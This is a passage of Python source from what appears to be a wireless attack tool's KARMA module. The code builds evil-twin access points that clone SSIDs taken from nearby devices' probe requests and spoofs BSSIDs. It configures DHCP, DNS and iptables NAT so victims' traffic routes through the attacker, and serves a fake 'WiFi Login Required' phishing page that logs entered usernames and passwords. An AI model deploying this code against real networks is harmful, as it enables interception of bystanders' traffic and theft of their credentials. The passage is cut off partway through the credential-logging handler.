                Color.pl('{+} {C}Ensuring rogue interface {G}%s{W} is in master mode for AP...{W}' % self.rogue_interface)
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to switch rogue interface to master mode{W}')
                    return False
            
            # Start rogue AP
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Starting rogue AP')
            if not self.start_rogue_ap():
                return False
            
            Color.pl('{+} {G}Rogue AP infrastructure setup complete{W}')
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Complete')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Failed to setup rogue AP: {O}%s{W}' % str(e))
            return False
    
    def create_hostapd_config(self):
        """Create hostapd configuration file for PNL-based Evil Twins"""
        try:
            # CRITICAL FIX: Use PNL networks instead of target network
            target_network = self.find_best_network_to_clone()
            
            if target_network is None and hasattr(self, 'pnl_networks') and self.pnl_networks:
                # Use PNL networks (the correct KARMA approach)
                Color.pl('{+} {G}Creating Evil Twins from probe requests (PNL) - OLD CODE APPROACH{W}')
                return self._create_pnl_based_configs()
            elif target_network:
                # Fallback to target network if no PNL
                Color.pl('{!} {O}No PNL available - falling back to target network{W}')
                return self._create_target_based_configs(target_network)
            else:
                error_msg = 'No suitable networks found to clone'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}This usually means no networks with clients were found during scanning{W}')
                Color.pl('{!} {O}Try running a longer scan or ensure you are in an area with active networks{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            target_ssid = target_network.essid
            target_bssid = target_network.bssid
            target_channel = int(target_network.channel)
            
            # Check if this is the user's selected target
            user_target = getattr(self, 'target', None)
            is_user_target = user_target and user_target.essid == target_ssid
            
            if is_user_target:
                Color.pl('{+} {G}Creating Evil Twin for user-selected target: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            else:
                Color.pl('{+} {G}Creating Evil Twin for: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            
            # Ensure SSID is not too long (max 32 characters)
            if len(target_ssid) > 32:
                target_ssid = target_ssid[:32]
            
            # Create multiple hostapd configs for different networks
            self.hostapd_configs = []
            
            # Get encryption type from configuration
            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
            
            # Create config for the primary target network
            primary_config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid, encryption_type)
            if primary_config:
                self.hostapd_configs.append(primary_config)
                Color.pl('{+} {G}Created Evil Twin for: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            
            # Create additional configs for other popular networks
            for ssid in list(self.pnl_networks)[:3]:  # Limit to 3 additional networks
                if ssid != target_ssid and ssid != '<MISSING>' and ssid.strip():
                    additional_config = self.create_single_hostapd_config(ssid, target_channel, None, encryption_type)
                    if additional_config:
                        self.hostapd_configs.append(additional_config)
                        Color.pl('{+} {G}Created additional Evil Twin: {C}%s{W}' % ssid)
            
            if self.hostapd_configs:
                self.hostapd_config = self.hostapd_configs[0]  # Primary config
                Color.pl('{+} {G}Created {C}%d{W} Evil Twin configurations{W}' % len(self.hostapd_configs))
                return True
            else:
                return False
            
        except Exception as e:
            Color.pl('{!} {R}Failed to create hostapd configs: {O}%s{W}' % str(e))
            return False
    
    def _create_pnl_based_configs(self):
        """Create Evil Twin configs based on probe requests (PNL) + real networks - HYBRID APPROACH"""
        try:
            Color.pl('{+} {G}Creating Evil Twins from probe requests + real networks - HYBRID APPROACH!{W}')
            
            # Get a good channel (use target channel or default)
            target_channel = 6  # Default channel
            if hasattr(self, 'target') and self.target and self.target.channel:
                target_channel = int(self.target.channel)
            elif hasattr(self, 'real_networks') and self.real_networks:
                target_channel = int(self.real_networks[0].channel)
            
            Color.pl('{+} {C}Using channel {G}%d{W} for Evil Twins{W}' % target_channel)
            
            # Create configs for BOTH PNL SSIDs AND real networks
            self.hostapd_configs = []
            created_count = 0
            
            # Get encryption type from configuration
            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
            
            # Step 1: Create Evil Twins for PNL SSIDs (from probe requests)
            Color.pl('{+} {C}Step 1: Creating Evil Twins from probe requests (PNL)...{W}')
            for ssid in list(self.pnl_networks):
                if ssid and ssid != '<MISSING>' and ssid.strip() and len(ssid) <= 32:
                    config = self.create_single_hostapd_config(ssid, target_channel, None, encryption_type)
                    if config:
                        self.hostapd_configs.append(config)
                        created_count += 1
                        Color.pl('{+} {G}Created PNL Evil Twin: {C}%s{W}' % ssid)
                        
                        # Limit to 3 PNL Evil Twins
                        if created_count >= 3:
                            break
            
            # Step 2: Create Evil Twins for real networks with clients (CRITICAL FIX!)
            Color.pl('{+} {C}Step 2: Creating Evil Twins for real networks being deauthed...{W}')
            if hasattr(self, 'real_networks') and self.real_networks:
                for network in self.real_networks:
                    if network.clients and network.essid_known and network.essid:
                        # Use the network's actual channel for better compatibility
                        network_channel = int(network.channel) if network.channel else target_channel
                        
                        config = self.create_single_hostapd_config(network.essid, network_channel, network.bssid, encryption_type)
                        if config:
                            self.hostapd_configs.append(config)
                            created_count += 1
                            Color.pl('{+} {G}Created Real Network Evil Twin: {C}%s{W} (Channel {C}%d{W})' % (network.essid, network_channel))
                            
                            # Limit to 5 total Evil Twins
                            if created_count >= 5:
                                break
            
            if created_count > 0:
                # Choose the best primary config (prioritize real networks with clients)
                primary_config = self.select_best_primary_config()
                self.hostapd_config = primary_config
                
                Color.pl('{+} {G}Successfully created {C}%d{W} Evil Twin configurations{W}' % created_count)
                Color.pl('{+} {G}Hybrid approach: PNL SSIDs + Real Network SSIDs = Maximum effectiveness!{W}')
                Color.pl('{+} {G}Primary Evil Twin selected for maximum client connection success!{W}')
                return True
            else:
                Color.pl('{!} {R}Failed to create any Evil Twin configs{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error creating hybrid Evil Twin configs: {O}%s{W}' % str(e))
            return False
    
    def select_best_primary_config(self):
        """Select the best primary Evil Twin config for maximum effectiveness"""
        try:
            if not self.hostapd_configs:
                return None
            
            # Priority 1: Real networks with clients (highest success rate)
            for config_file in self.hostapd_configs:
                config_name = config_file.split('/')[-1]  # Get filename
                for network in self.real_networks:
                    if network.essid and network.essid in config_name and network.clients:
                        Color.pl('{+} {G}Selected primary Evil Twin: {C}%s{W} (Real network with clients){W}' % network.essid)
                        return config_file
            
            # Priority 2: PNL networks (familiar networks)
            for config_file in self.hostapd_configs:
                config_name = config_file.split('/')[-1]  # Get filename
                for ssid in self.pnl_networks:
                    if ssid in config_name:
                        Color.pl('{+} {G}Selected primary Evil Twin: {C}%s{W} (PNL network){W}' % ssid)
                        return config_file
            
            # Fallback: First config
            Color.pl('{+} {G}Selected primary Evil Twin: First available config{W}')
            return self.hostapd_configs[0]
            
        except Exception as e:
            Color.pl('{!} {R}Error selecting primary config: {O}%s{W}' % str(e))
            return self.hostapd_configs[0] if self.hostapd_configs else None
    
    def _create_target_based_configs(self, target_network):
        """Create Evil Twin configs based on target network (fallback)"""
        try:
            target_ssid = target_network.essid
            target_bssid = target_network.bssid
            target_channel = int(target_network.channel)
            
            Color.pl('{+} {G}Creating Evil Twin for target network: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            
            # Get encryption type from configuration
            encryption_type = getattr(Configuration, 'karma_encryption', 'mixed')
            
            # Create config for the target network
            self.hostapd_configs = []
            config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid, encryption_type)
            if config:
                self.hostapd_configs.append(config)
                Color.pl('{+} {G}Created Evil Twin for: {C}%s{W}' % target_ssid)
                return True
            else:
                Color.pl('{!} {R}Failed to create Evil Twin config{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error creating target-based configs: {O}%s{W}' % str(e))
            return False
    
    def find_best_network_to_clone(self):
        """Find the best network to clone - prioritize PNL SSIDs over target network"""
        try:
            # CRITICAL FIX: Don't clone the target network - clone PNL networks instead!
            # This is why the old code worked - it created Evil Twins with DIFFERENT SSIDs
            
            Color.pl('{+} {C}KARMA Strategy: Creating Evil Twins from probe requests (PNL), not target network{W}')
            
            # Check if we have captured probe requests (PNL)
            if hasattr(self, 'pnl_networks') and self.pnl_networks:
                Color.pl('{+} {G}Found {C}%d{W} SSIDs from probe requests (PNL){W}' % len(self.pnl_networks))
                
                # Show captured SSIDs
                Color.pl('{+} {C}Captured SSIDs from nearby devices:{W}')
                for i, ssid in enumerate(list(self.pnl_networks)[:5], 1):  # Show first 5
                    if ssid and ssid != '<MISSING>' and ssid.strip():
                        Color.pl('  {G}%d.{W} {C}%s{W}' % (i, ssid))
                
                # Return None to indicate we should use PNL networks, not real networks
                Color.pl('{+} {G}Will create Evil Twins for PNL SSIDs - clients will connect to familiar networks{W}')
                return None
            else:
                Color.pl('{!} {O}No probe requests captured - falling back to target network{W}')
                # Fallback to original logic if no PNL
                return self._find_fallback_network()
            
        except Exception as e:
            Color.pl('{!} {R}Error finding best network to clone: {O}%s{W}' % str(e))
            return None
    
    def _find_fallback_network(self):
        """Fallback method to find a real network when no PNL is available"""
        try:
            # If user target not found or not specified, use original logic
            Color.pl('{+} {C}Selecting best network automatically based on client activity and popularity{W}')
            
            for network in self.real_networks:
                if not network.essid_known or not network.essid:
                    continue
                
                # Calculate score based on:
                # 1. Number of clients (more clients = higher chance of saved passwords)
                # 2. Network popularity (common names)
                # 3. Signal strength (closer networks)
                
                score = len(network.clients) * 10  # Base score from client count
                
                # Bonus for common network names
                common_names = ['home', 'wifi', 'internet', 'router', 'network', 'linksys', 'netgear', 'tp-link']
                essid_lower = network.essid.lower()
                for common in common_names:
                    if common in essid_lower:
                        score += 5
                        break
                
                # Bonus for strong signal (closer to 0 is better)
                try:
                    power = int(network.power)
                    if power > -50:  # Very strong signal
                        score += 3
                    elif power > -70:  # Good signal
                        score += 1
                except:
                    pass
                
                if score > max_score:
                    max_score = score
                    best_network = network
            
            if best_network:
                Color.pl('{+} {C}Selected best network to clone: {G}%s{W} (Score: {C}%d{W})' % 
                        (best_network.essid, max_score))
                Color.pl('{+} {G}Selected network has {C}%d{W} clients{W}' % len(best_network.clients))
            
            return best_network
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error finding best network: {O}%s{W}' % str(e))
            return None
    
    def detect_best_hostapd_driver(self):
        """Detect the best hostapd driver for the current interface"""
        try:
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                return 'nl80211'  # Default fallback
            
            Color.pl('{+} {C}Detecting best hostapd driver for {G}%s{W}...{W}' % interface)
            
            # Method 1: Check if interface supports nl80211 (modern driver)
            try:
                result = subprocess.run(['iw', interface, 'info'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    if 'nl80211' in result.stdout:
                        Color.pl('{+} {G}Detected nl80211 driver support for {G}%s{W}' % interface)
                        return 'nl80211'
                    elif 'type managed' in result.stdout:
                        Color.pl('{+} {C}Interface {G}%s{W} is in managed mode - will use nl80211{W}' % interface)
                        return 'nl80211'
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}iw info failed: {O}%s{W}' % str(e))
            
            # Method 2: Check if interface supports AP mode with nl80211
            try:
                result = subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    Color.pl('{+} {G}Interface {G}%s{W} supports AP mode with nl80211{W}' % interface)
                    # Reset back to managed
                    subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=3)
                    return 'nl80211'
                else:
                    Color.pl('{!} {O}Interface {G}%s{W} does not support AP mode with nl80211{W}' % interface)
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}AP mode test failed: {O}%s{W}' % str(e))
            
            # Method 3: Check if interface supports hostap driver (legacy)
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    # Check if it's a legacy interface that might support hostap
                    if 'IEEE 802.11' in result.stdout:
                        Color.pl('{+} {C}Detected legacy interface - trying hostap driver{W}')
                        return 'hostap'
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}iwconfig check failed: {O}%s{W}' % str(e))
            
            # Method 4: Check interface capabilities
            try:
                result = subprocess.run(['iw', interface, 'list'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    if 'AP' in result.stdout or 'ap' in result.stdout:
                        Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
                        return 'nl80211'
                    else:
                        Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
                        return None  # Interface doesn't support AP mode
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}iw list failed: {O}%s{W}' % str(e))
            
            # Fallback to nl80211
            Color.pl('{!} {O}Using nl80211 driver as fallback for {G}%s{W}' % interface)
            return 'nl80211'
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error detecting hostapd driver: {O}%s{W}' % str(e))
            return 'nl80211'  # Default fallback
    
    def check_interface_ap_support(self, interface):
        """Check if interface supports AP mode"""
        try:
            Color.pl('{+} {C}Checking AP mode support for {G}%s{W}...{W}' % interface)
            
            # Method 1: Check with iw list
            try:
                result = subprocess.run(['iw', interface, 'list'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    if 'AP' in result.stdout or 'ap' in result.stdout:
                        Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
                        return True
                    else:
                        Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
                        return False
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}iw list failed: {O}%s{W}' % str(e))
            
            # Method 2: Try to set AP mode
            try:
                result = subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
                    # Reset back to managed
                    subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=3)
                    return True
                else:
                    Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
                    return False
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}AP mode test failed: {O}%s{W}' % str(e))
            
            # Method 3: Check with iwconfig
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    if 'IEEE 802.11' in result.stdout:
                        Color.pl('{+} {C}Interface {G}%s{W} is a wireless interface - may support AP mode{W}' % interface)
                        return True
            except Exception as e:
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}iwconfig check failed: {O}%s{W}' % str(e))
            
            Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking AP support: {O}%s{W}' % str(e))
            return False
    
    
    def create_single_hostapd_config(self, ssid, channel, spoof_bssid=None, encryption_type='wpa2'):
        """Create a single hostapd configuration file with WPA/WPA2/WPA3 for credential capture
        
        Args:
            ssid: SSID name
            channel: WiFi channel
            spoof_bssid: Optional BSSID to spoof
            encryption_type: 'wpa', 'wpa2', 'wpa3', 'none' (default: 'wpa2')
        """
        try:
            # Ensure SSID is not too long
            if len(ssid) > 32:
                ssid = ssid[:32]
            
            # Build base configuration
            config_content = f"""interface={self.rogue_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            
            # Add encryption based on type
            if encryption_type.lower() == 'wpa':
                # WPA (TKIP) - legacy support
                config_content += """# Enable WPA (TKIP) for credential capture
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
wpa_passphrase=karma12345678
"""
                Color.pl('{+} {G}Configured WPA (TKIP) encryption for {C}%s{W}' % ssid)
                
            elif encryption_type.lower() == 'wpa2':
                # WPA2 (CCMP) - most common
                config_content += """# Enable WPA2 (CCMP) for credential capture
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=karma12345678
"""
                Color.pl('{+} {G}Configured WPA2 (CCMP) encryption for {C}%s{W}' % ssid)
                
            elif encryption_type.lower() == 'wpa3':
                # WPA3 (SAE) - modern encryption
                config_content += """# Enable WPA3 (SAE) for credential capture
wpa=3
wpa_key_mgmt=SAE
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=karma12345678
sae_password=karma12345678
ieee80211w=2
"""
                Color.pl('{+} {G}Configured WPA3 (SAE) encryption for {C}%s{W}' % ssid)
                
            elif encryption_type.lower() == 'mixed':
                # WPA2/WPA3 mixed mode - maximum compatibility
                config_content += """# Enable WPA2/WPA3 mixed mode for maximum compatibility
wpa=3
wpa_key_mgmt=WPA-PSK SAE
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=karma12345678
sae_password=karma12345678
ieee80211w=2
"""
                Color.pl('{+} {G}Configured WPA2/WPA3 mixed mode encryption for {C}%s{W}' % ssid)
                
            else:
                # No encryption - open network (for initial testing)
                Color.pl('{+} {O}No encryption configured for {C}%s{W} (open network){W}' % ssid)
            
            # Add BSSID spoofing if specified
            if spoof_bssid:
                config_content += f"bssid={spoof_bssid}\n"
            
            config_file = Configuration.temp('hostapd_karma_%s_%s.conf' % (ssid.replace(' ', '_'), encryption_type))
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            return config_file
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Failed to create config for {G}%s{W}: {O}%s{W}' % (ssid, str(e)))
            return None
    
    def setup_dhcp_server(self):
        """Setup DHCP server using dnsmasq"""
        try:
            # Check if dnsmasq is available before creating config
            try:
                result = subprocess.run(['dnsmasq', '--version'], capture_output=True, text=True, timeout=5)
                if result.returncode != 0:
                    error_msg = 'dnsmasq not available for DHCP setup'
                    Color.pl('{!} {R}%s{W}' % error_msg)
                    Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
                    
                    # Also log to GUI
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
                    return False
            except:
                error_msg = 'dnsmasq not available for DHCP setup'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
                return False
            
            # Create dnsmasq configuration (bind to interface and avoid host/system resolvers)
            leases_path = Configuration.temp('dnsmasq.leases')
            log_path = Configuration.temp('dnsmasq.log')
            config_content = f"""interface={self.rogue_interface}
bind-interfaces
except-interface=lo
no-resolv
no-hosts
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-leasefile={leases_path}
log-queries
log-dhcp
log-facility={log_path}
server=8.8.8.8
"""
            
            config_file = Configuration.temp('dnsmasq_karma.conf')
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            self.dnsmasq_config = config_file
            Color.pl('{+} {G}Created dnsmasq configuration{W}')
            return True
            
        except Exception as e:
            error_msg = 'Failed to setup DHCP server: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
            return False
    
    def setup_dns_redirection(self):
        """Setup DNS redirection using iptables"""
        try:
            # Check for potential conflicts with resolvconf/systemd-resolved
            try:
                # Check for resolvconf
                result = subprocess.run(['which', 'resolvconf'], capture_output=True, text=True)
                if result.returncode == 0:
                    Color.pl('{!} {O}Warning: resolvconf detected - may cause DNS conflicts with dnsmasq{W}')
                    Color.pl('{!} {O}If DNS issues occur, stop systemd-resolved: sudo systemctl stop systemd-resolved{W}')
                
                # Check for systemd-resolved
                result = subprocess.run(['systemctl', 'is-active', 'systemd-resolved'], capture_output=True, text=True)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}Warning: systemd-resolved is active - stopping to prevent conflicts{W}')
                    try:
                        subprocess.run(['systemctl', 'stop', 'systemd-resolved'], check=True, timeout=10)
                        Color.pl('{+} {G}Stopped systemd-resolved{W}')
                    except subprocess.CalledProcessError:
                        Color.pl('{!} {R}Failed to stop systemd-resolved - port 53 may be in use{W}')
                    except subprocess.TimeoutExpired:
                        Color.pl('{!} {R}Timeout stopping systemd-resolved{W}')
            except:
                pass
            
            # Setup iptables rules for traffic redirection
            # DISABLED: Web interface at 10.0.0.1 removed - no DNAT rules
            commands = [
                f'ifconfig {self.rogue_interface} 10.0.0.1/24 up',
                'echo "1" > /proc/sys/net/ipv4/ip_forward',
                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80',
                f'iptables -A FORWARD -i {self.rogue_interface} -j ACCEPT'
            ]
            
            failed_commands = []
            for cmd in commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    Color.pl('{!} {R}Warning: Command failed: {O}%s{W}' % cmd)
                    if result.stderr:
                        Color.pl('{!} {O}Error: {R}%s{W}' % result.stderr.strip())
                    failed_commands.append(cmd)
            
            if failed_commands:
                error_msg = f'DNS redirection partially failed - {len(failed_commands)} commands failed'
                Color.pl('{!} {R}%s{W}' % error_msg)
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'DNS Redirection', 'Warning - ' + error_msg)
            else:
                Color.pl('{+} {G}DNS redirection setup complete{W}')
            
            return True
            
        except Exception as e:
            error_msg = 'Failed to setup DNS redirection: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'DNS Redirection', 'Failed - ' + error_msg)
            return False
    
    def setup_internet_access(self):
        """Setup internet access for victims by bridging traffic to real internet"""
        try:
            Color.pl('{+} {C}Setting up internet access for victims...{W}')
            
            # Detect internet interface (usually eth0, enp0s3, etc.)
            internet_interface = self.detect_internet_interface()
            if not internet_interface:
                Color.pl('{!} {R}Could not detect internet interface - internet access disabled{W}')
                return False
            
            Color.pl('{+} {G}Detected internet interface: {C}%s{W}' % internet_interface)
            
            # Setup internet bridging commands
            commands = [
                # Enable IP forwarding
                'echo "1" > /proc/sys/net/ipv4/ip_forward',
                
                # Forward traffic from AP to internet
                f'iptables -A FORWARD -i {self.rogue_interface} -o {internet_interface} -j ACCEPT',
                
                # Allow established connections back
                f'iptables -A FORWARD -i {internet_interface} -o {self.rogue_interface} -m state --state ESTABLISHED,RELATED -j ACCEPT',
                
                # NAT for internet access
                f'iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE',
                
                # DISABLED: Web interface at 10.0.0.1 removed - no DNAT rules
                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
                # f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80'
            ]
            
            failed_commands = []
            for cmd in commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    Color.pl('{!} {R}Warning: Command failed: {O}%s{W}' % cmd)
                    if result.stderr:
                        Color.pl('{!} {O}Error: {R}%s{W}' % result.stderr.strip())
                    failed_commands.append(cmd)
            
            if failed_commands:
                error_msg = f'Internet access setup partially failed - {len(failed_commands)} commands failed'
                Color.pl('{!} {R}%s{W}' % error_msg)
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Internet Access', 'Warning - ' + error_msg)
            else:
                Color.pl('{+} {G}Internet access setup complete - victims can now access internet{W}')
                Color.pl('{+} {C}HTTP/HTTPS traffic will be captured for credential harvesting{W}')
            
            # Store internet interface for cleanup
            self.internet_interface = internet_interface
            
            return True
            
        except Exception as e:
            error_msg = 'Failed to setup internet access: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Internet Access', 'Failed - ' + error_msg)
            return False
    
    def detect_internet_interface(self):
        """Detect the interface connected to the internet"""
        try:
            # Get default route interface
            result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'default via' in line:
                        # Extract interface from route (e.g., "default via 192.168.1.1 dev eth0")
                        parts = line.split()
                        for i, part in enumerate(parts):
                            if part == 'dev' and i + 1 < len(parts):
                                interface = parts[i + 1]
                                # Verify interface exists and is up
                                if self.verify_interface_up(interface):
                                    return interface
            
            # Fallback: try common interface names
            common_interfaces = ['eth0', 'enp0s3', 'ens33', 'wlan1', 'wlp2s0']
            for interface in common_interfaces:
                if self.verify_interface_up(interface):
                    return interface
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error detecting internet interface: {O}%s{W}' % str(e))
            return None
    
    def verify_interface_up(self, interface):
        """Verify that an interface exists and is up"""
        try:
            result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
            if result.returncode == 0 and 'state UP' in result.stdout:
                return True
            return False
        except Exception:
            return False
    
    def start_credential_harvesting_server(self):
        """Start web server for credential harvesting"""
        try:
            Color.pl('{+} {C}Starting credential harvesting web server...{W}')
            
            # Create web server directory
            web_dir = os.path.join(Configuration.karma_captures_dir, 'web_server')
            os.makedirs(web_dir, exist_ok=True)
            
            # Create fake login pages
            self.create_fake_login_pages(web_dir)
            
            # Start web server
            self.web_server_process = subprocess.Popen([
                'python3', '-m', 'http.server', '80', '--directory', web_dir
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Give it time to start
            time.sleep(2)
            
            # Check if server started successfully
            if self.web_server_process.poll() is None:
                Color.pl('{+} {G}Credential harvesting web server started on port 80{W}')
                Color.pl('{+} {C}Victims will see fake login pages when accessing websites{W}')
                Color.pl('{+} {C}Credentials will be logged to: {G}%s{W}' % os.path.join(web_dir, 'credentials.log'))
                return True
            else:
                Color.pl('{!} {R}Failed to start web server - continuing without credential harvesting{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error starting credential harvesting server: {O}%s{W}' % str(e))
            return False
    
    def create_fake_login_pages(self, web_dir):
        """Create fake login pages for credential harvesting"""
        try:
            # Create main index page
            index_html = """<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #555; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .error { color: red; text-align: center; margin-top: 10px; }
        .success { color: green; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Login Required</h1>
        <p style="text-align: center; color: #666; margin-bottom: 30px;">Please enter your WiFi credentials to continue</p>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div id="message"></div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // Send credentials to server
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('message').innerHTML = '<div class="success">Connecting to WiFi... Please wait.</div>';
                // Redirect to a fake success page after 3 seconds
                setTimeout(function() {
                    window.location.href = '/success';
                }, 3000);
            })
            .catch(error => {
                document.getElementById('message').innerHTML = '<div class="error">Connection failed. Please try again.</div>';
            });
        });
    </script>
</body>
</html>"""
            
            with open(os.path.join(web_dir, 'index.html'), 'w') as f:
                f.write(index_html)
            
            # Create login handler script
            login_handler = """#!/usr/bin/env python3
import os
import time
from urllib.parse import parse_qs

def handle_login(environ, start_response):
    if environ['REQUEST_METHOD'] == 'POST':
        # Get POST data
        try:
            request_body_size = int(environ.get('CONTENT_LENGTH', 0))
        except ValueError:
            request_body_size = 0
        
        request_body = environ['wsgi.input'].read(request_body_size)
        post_data = parse_qs(request_body.decode('utf-8'))
        
        username = post_data.get('username', [''])[0]
        password = post_data.get('password', [''])[0]
        
        # Log credentials
        log_file = os.path.join(os.path.dirname(__file__), 'credentials.log')
        with open(log_file, 'a') as f:
